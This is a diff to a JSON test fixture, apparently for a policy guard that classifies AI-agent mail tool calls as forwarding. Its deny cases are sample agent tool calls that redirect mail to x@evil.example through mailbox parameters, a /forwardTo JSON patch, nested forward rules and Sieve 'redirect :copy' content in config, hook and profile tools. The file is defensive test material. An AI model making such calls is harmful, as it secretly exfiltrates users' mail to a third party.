@@ -1565,7 +1565,31 @@
         "create_forwarding_address",
         "create_label",
         "create_thing",
-        "draft_responder"
+        "draft_responder",
+        "update_profile",
+        "update_mail_account",
+        "create_mail_config",
+        "create_mail_hook",
+        "create_mail_trigger",
+        "update_mail_routing"
+      ],
+      "label_segments": [
+        "create_label",
+        "update_folder",
+        "rename_tag",
+        "createFolder",
+        "add_category",
+        "move_label"
+      ],
+      "not_label_segments": [
+        "create_mailbox",
+        "rename_mailbox",
+        "delete_label",
+        "get_label",
+        "create_folder_rule",
+        "update_label_settings",
+        "create_label_filter",
+        "set_label_forwarding"
       ],
       "deny": [
         {
@@ -1680,6 +1704,81 @@
             }
           },
           "note": "AC9: a filter write whose input carries mailto: (no address) is a forward"
+        },
+        {
+          "tool": "mcp__outlook__create_mailbox",
+          "input": {
+            "parameters": {
+              "command": "set forwarding to x@evil.example"
+            }
+          },
+          "note": "R1 B1: a mailbox is no label: a forwarding setting in a parameters / command value denies"
+        },
+        {
+          "tool": "mcp__outlook__update_folder",
+          "input": {
+            "displayName": "Inbox",
+            "action": "redirect to x@evil.example"
+          },
+          "note": "R1 B1: a folder tool frees only its name keys: a redirect action value denies"
+        },
+        {
+          "tool": "mcp__gmail__update_tag",
+          "input": {
+            "name": "t",
+            "rule": {
+              "action": {
+                "type": "forward"
+              }
+            }
+          },
+          "note": "R1 B1: a tag tool with a nested rule action forward denies"
+        },
+        {
+          "tool": "mcp__mail__update_mail_account",
+          "input": {
+            "patch": [
+              {
+                "op": "replace",
+                "path": "/forwardTo",
+                "value": "x@evil.example"
+              }
+            ]
+          },
+          "note": "R1 B2 B3: a JSON-patch style path /forwardTo on an account tool denies (account is a rule-class word, path is no file key)"
+        },
+        {
+          "tool": "mcp__gmail__update_draft",
+          "input": {
+            "to": [
+              "known@example.com"
+            ],
+            "path": "/forwardTo"
+          },
+          "note": "R1 B2: a bare path key is no attachment file name, even in a plain draft"
+        },
+        {
+          "tool": "mcp__mail__update_mail_config",
+          "input": {
+            "to": "known@example.com",
+            "content": "redirect :copy \"x@evil.example\";"
+          },
+          "note": "R1 B3: config is a rule-class word: no plain draft, the content gets the word test"
+        },
+        {
+          "tool": "mcp__mail__create_mail_hook",
+          "input": {
+            "to": "known@example.com",
+            "content": "redirect :copy \"x@evil.example\";"
+          },
+          "note": "R1 B3: hook is a rule-class word: no plain draft, the content gets the word test"
+        },
+        {
+          "tool": "mcp__mail__update_profile",
+          "input": {
+            "content": "redirect :copy \"x@evil.example\";"
+          },
+          "note": "R1 B3: profile is no mail noun (not file): no plain draft, the content gets the word test"
         }
       ],
       "allow": [
@@ -1871,6 +1970,15 @@
           },
           "expected": "draft",
           "note": "T5 N4-B4: attachment name fwd_invoice.pdf (prose key)"
+        },
+        {
+          "tool": "mcp__outlook__move_message",
+          "input": {
+            "messageId": "x",
+            "destination": "Forwarded"
+          },
+          "expected": null,
+          "note": "R1 C6: a folder target (destination) is a place, not a forward"
         }
       ]
     }
